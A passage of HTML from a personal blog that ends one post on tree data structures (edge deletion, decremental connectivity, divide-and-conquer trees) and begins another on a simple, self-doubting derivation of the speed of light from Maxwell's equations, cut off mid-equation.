<p>The surprising benefit of this extra information is that you can now perform edge deletions in <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>! To remove an edge, we attach the near child to the parent and separate the far child:</p>

<svg xmlns="http://www.w3.org/2000/svg" width="348pt" height="220pt" viewBox="0.00 0.00 348.00 220.00">
  <g class="graph" transform="scale(1 1) rotate(0) translate(4 216)">
    <title>%3</title>
    <g class="cluster">
      <title>cluster_0</title>
      <polygon fill="transparent" stroke="black" points="8,-8 8,-204 158,-204 158,-8 8,-8" />
    </g>
    <g class="cluster">
      <title>cluster_1</title>
      <polygon fill="transparent" stroke="black" points="166,-80 166,-204 332,-204 332,-80 166,-80" />
    </g>
    <g class="node">
      <title>parent</title>
      <ellipse fill="none" stroke="black" cx="83" cy="-178" rx="40.09" ry="18" />
      <text text-anchor="middle" x="83" y="-174.3" font-family="Times,serif" font-size="14.00">parent</text>
    </g>
    <g class="node">
      <title>elem</title>
      <ellipse fill="none" stroke="black" cx="83" cy="-106" rx="30.59" ry="18" />
      <text text-anchor="middle" x="83" y="-102.3" font-family="Times,serif" font-size="14.00">elem</text>
    </g>
    <g class="edge">
      <title>parent-&gt;elem</title>
      <path fill="none" stroke="black" d="M83,-159.7C83,-151.98 83,-142.71 83,-134.11" />
      <polygon fill="black" stroke="black" points="86.5,-134.1 83,-124.1 79.5,-134.1 86.5,-134.1" />
    </g>
    <g class="node">
      <title>near</title>
      <ellipse fill="none" stroke="black" cx="47" cy="-34" rx="30.59" ry="18" />
      <text text-anchor="middle" x="47" y="-30.3" font-family="Times,serif" font-size="14.00">near</text>
    </g>
    <g class="edge">
      <title>elem-&gt;near</title>
      <path fill="none" stroke="black" d="M74.47,-88.41C70.16,-80.04 64.85,-69.71 60.05,-60.37" />
      <polygon fill="black" stroke="black" points="63.16,-58.76 55.47,-51.47 56.93,-61.96 63.16,-58.76" />
    </g>
    <g class="node">
      <title>far</title>
      <ellipse fill="none" stroke="black" cx="123" cy="-34" rx="27" ry="18" />
      <text text-anchor="middle" x="123" y="-30.3" font-family="Times,serif" font-size="14.00">far</text>
    </g>
    <g class="edge">
      <title>elem-&gt;far</title>
      <path fill="none" stroke="black" d="M92.28,-88.76C97.17,-80.19 103.29,-69.49 108.77,-59.9" />
      <polygon fill="black" stroke="black" points="111.85,-61.57 113.77,-51.15 105.77,-58.09 111.85,-61.57" />
    </g>
    <g class="node">
      <title>parent'</title>
      <ellipse fill="none" stroke="black" cx="249" cy="-178" rx="44.69" ry="18" />
      <text text-anchor="middle" x="249" y="-174.3" font-family="Times,serif" font-size="14.00">parent'</text>
    </g>
    <g class="node">
      <title>near'</title>
      <ellipse fill="none" stroke="black" cx="209" cy="-106" rx="35.19" ry="18" />
      <text text-anchor="middle" x="209" y="-102.3" font-family="Times,serif" font-size="14.00">near'</text>
    </g>
    <g class="edge">
      <title>parent'-&gt;near'</title>
      <path fill="none" stroke="black" d="M239.32,-160.05C234.6,-151.8 228.83,-141.7 223.59,-132.54" />
      <polygon fill="black" stroke="black" points="226.59,-130.73 218.59,-123.79 220.52,-134.21 226.59,-130.73" />
    </g>
    <g class="node">
      <title>far'</title>
      <ellipse fill="none" stroke="black" cx="293" cy="-106" rx="30.59" ry="18" />
      <text text-anchor="middle" x="293" y="-102.3" font-family="Times,serif" font-size="14.00">far'</text>
    </g>
    <g class="edge">
      <title>parent'-&gt;far'</title>
      <path fill="none" stroke="transparent" d="M259.43,-160.41C264.74,-151.95 271.32,-141.49 277.24,-132.08" />
      <polygon fill="transparent" stroke="transparent" points="280.29,-133.8 282.65,-123.47 274.36,-130.07 280.29,-133.8" />
    </g>
  </g>
</svg>
<p><em>Figure 6: Removing an edge</em></p>

<p>If we also support the ability to get the root node of any tree to check if two vertices are connected, we’ll be able to support what’s known as <em>decremental connectivity</em> on a tree.</p>

<p>Implementation-wise, we can use a treap (<a href="https://en.wikipedia.org/wiki/Join-based_tree_algorithms">or any data structure resembling a <em>rope</em></a>) to store the flattened version of the tree. Creating this structure in the first place is “left as an exercise to the reader.”<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup></p>

<h2 id="further-reading"><a href="#further-reading">Further Reading</a></h2>

<p>While looking at existing literature, I found some interesting papers discussing data structures similar to what I’ve described here:</p>

<ul>
  <li><a href="https://erikdemaine.org/papers/Cartesian_ICALP2009/paper.pdf">“On Cartesian Trees and Range Minimum Queries”</a></li>
  <li><a href="https://www.cs.princeton.edu/research/techreps/TR-096-87">“Computing on a Free Tree Via Complexity-Preserving Mappings”</a></li>
</ul>

<hr />

<h2 id="extra-trees-arising-from-divide-and-conquer"><a href="#extra-trees-arising-from-divide-and-conquer">Extra: Trees Arising From Divide and Conquer</a></h2>

<p>A general idea we can take from centroid trees is that many recursive procedures can lend themselves to trees. In the original version of this article, I called them “implicit divide and conquer trees”<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote">3</a></sup>, and are roughly made by:</p>

<ol>
  <li>picking an element from a structure and extracting it into the root of a tree; then</li>
  <li>recursing into the remaining parts and adding the returned trees as children.</li>
</ol>

<p>However, they can be generalised even further: instead of directly <em>extracting an element</em> a root node, we can let it be whatever information of about the structure we want. This definition covers a wide range of tree data structures, including:</p>

<ul>
  <li>Binary search trees, and their self-balancing variants</li>
  <li>Segment trees (with square-root decomposition as a kind of variant)</li>
  <li>Interval trees</li>
  <li>Tries</li>
</ul>

<p>So, in one way they’re way too general of a category, but it can still be a useful idea to consider.</p>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Normally this problem is solved either using a modified Dijskstra’s/Prim’s algorithm, or even Kruskal’s MST algorithm if all queries are available in advance. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>I haven’t really thought about how to construct this, even a year after the original article. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>Thanks you Tunan for suggesting this name. <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/speed-of-light">A simple "derivation" of the speed of light</a></h2>
  
    <div class="bounded"><p>By assuming the nature of the propagation of EM waves, we can derive the speed of light from Maxwell’s equations in a much simpler way and without advanced vector calculus. However, I’m not sure how valid this is, so if there’s any issues, please raise them on <a href="https://github.com/ralismark/ralismark.github.io">the repo for my blog</a>.</p>

<!--more-->

<p>I’m currently studying EM waves as part of HSC physics, and I looked at this for interest (though this is definitely beyond the syllabus). I shared this with my friend who might also post this derivation on <a href="https://sabicool.github.io/">his blog</a>. The reason I use quotes around “derivation” is that this seems too simple to be true - it doesn’t really require anything beyond the curl equation (and no need for a conceptual understanding either) and simple calculus.</p>

<h2 id="assumptions"><a href="#assumptions">Assumptions</a></h2>

<p>We assume that B and E are perpendicular and only exist along one line, the <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>x</mi><mo>&#x20d7;</mo></mover></mrow><annotation encoding="application/x-tex">\vec{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5
3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11
10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63
-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1
-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59
H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359
c-16-25.333-24-45-24-59z" /></svg></span></span></span></span></span></span></span></span></span></span> axis. This axis is also the direction of propagation, so <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>E</mi><mo>&#x20d7;</mo></mover><mo>&#xd7;</mo><mover accent="true"><mi>B</mi><mo>&#x20d7;</mo></mover><mo>&#x2225;</mo><mover accent="true"><mi>x</mi><mo>&#x20d7;</mo></mover></mrow><annotation encoding="application/x-tex">\vec{E} \times \vec{B} \parallel \vec{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0496599999999998em;vertical-align:-0.08333em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5
3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11
10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63
-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1
-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59
H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359
c-16-25.333-24-45-24-59z" /></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#xd7;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.21633em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5
3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11
10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63
-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1
-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59
H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359
c-16-25.333-24-45-24-59z" /></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2225;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5
3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11
10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63
-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1
-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59
H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359
c-16-25.333-24-45-24-59z" /></svg></span></span></span></span></span></span></span></span></span></span>. i.e.:</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mover accent="true"><mi>E</mi><mo>&#x20d7;</mo></mover></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mover accent="true"><mi>y</mi><mo>&#x20d7;</mo></mover></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mover accent="true"><mi>B</mi><mo>&#x20d7;</mo></mover></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>B</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mover accent="true"><mi>z</mi><mo>&#x20d7;</mo></mover></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
	\vec{E} &amp;= E(x) \vec{y}
\\	\vec{B} &amp;= B(x) \vec{z}
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.25266em;vertical-align:-1.37633em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.87633em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span><span style="top:-2.28367em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.37633em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.87633em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span><span style="top:-2.28367em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.37633em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>

<p><img src="/render/build/em-wave.svg" alt="" title="Electromagnetic Wave. Credits to sabicool." /></p>

<blockquote>
  <p>My friend I mentioned earlier showed me an in-depth explanation of this (though it’s not on his blog), which has a 3D LaTeX diagram. I might adapt it and include it, since this current explanation isn’t really that clear.</p>

  <p><em>Update, 10 Apr 2019</em>: He sent me the code, which I’ve adapted to create the above diagram. Credits to him.</p>
</blockquote>

<h2 id="maxwells-equations"><a href="#maxwells-equations">Maxwell’s Equations</a></h2>

<p>These are the relevant equations, after some simplification by assuming there are no charges:</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi mathvariant="normal">&#x2207;</mi><mo>&#xd7;</mo><mover accent="true"><mi>E</mi><mo>&#x20d7;</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>&#x2212;</mo><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mover accent="true"><mi>B</mi><mo>&#x20d7;</mo></mover></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>t</mi></mrow></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi mathvariant="normal">&#x2207;</mi><mo>&#xd7;</mo><mover accent="true"><mi>B</mi><mo>&#x20d7;</mo></mover></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mi>&#x3bc;</mi><mn>0</mn></msub><msub><mi>&#x3f5;</mi><mn>0</mn></msub><mfrac><mrow><mi mathvariant="normal">&#x2202;</mi><mover accent="true"><mi>E</mi><mo>&#x20d7;</mo></mover></mrow><mrow><mi mathvariant="normal">&#x2202;</mi><mi>t</mi></mrow></mfrac></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
	\nabla \times \vec{E} &amp;= -\frac{\partial \vec{B}}{\partial t}
\\	\nabla \times \vec{B} &amp;= \mu_0 \epsilon_0 \frac{\partial \vec{E}}{\partial t}
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.258660000000001em;vertical-align:-2.379330000000001em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.87933em;"><span style="top:-4.8793299999999995em;"><span class="pstrut" style="height:3.6433299999999997em;"></span><span class="mord"><span class="mord">∇</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span><span style="top:-2.249999999999999em;"><span class="pstrut" style="height:3.6433299999999997em;"></span><span class="mord"><span class="mord">∇</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.379330000000001em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.87933em;"><span style="top:-4.8793299999999995em;"><span class="pstrut" style="height:3.6433299999999997em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.64333em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">t</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9663299999999999em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span><span style="top:-3.25233em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewBox="0 0 471 714" preserveAspectRatio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5 3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11 10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63 -1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1 -7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59 H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359 c-16-25.333-24-45-24-59z"></path></svg></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.249999999999999em;"><span class="pstrut" style="height:3.6433299999999997em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 